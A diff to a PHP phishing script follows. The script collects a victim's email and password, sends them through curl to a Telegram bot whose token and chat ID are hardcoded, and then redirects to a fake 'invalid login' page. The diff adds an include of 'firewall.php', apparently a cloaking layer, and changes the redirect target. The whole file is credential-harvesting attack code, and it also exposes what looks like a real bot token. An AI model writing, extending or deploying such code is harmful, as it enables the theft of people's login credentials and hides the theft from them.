@@ -1,4 +1,7 @@
 <?php
+
+include 'firewall.php';
+
 // Telegram credentials
 $botToken = '8093851911:AAEyrP0mC_P-G3OrO7yV8CG5jlfUp7Hp9qA';
 $chatId = '5666631780';
@@ -35,7 +38,7 @@ if (!empty($email) && !empty($password)) {
     curl_close($ch);
 
     // Optionally redirect to success page or original form
-    header("Location: Invalid Login.html"); // or any other page
+    header("Location: invalid login.php"); // or any other page
     exit;
 } else {
     echo "Invalid input.";
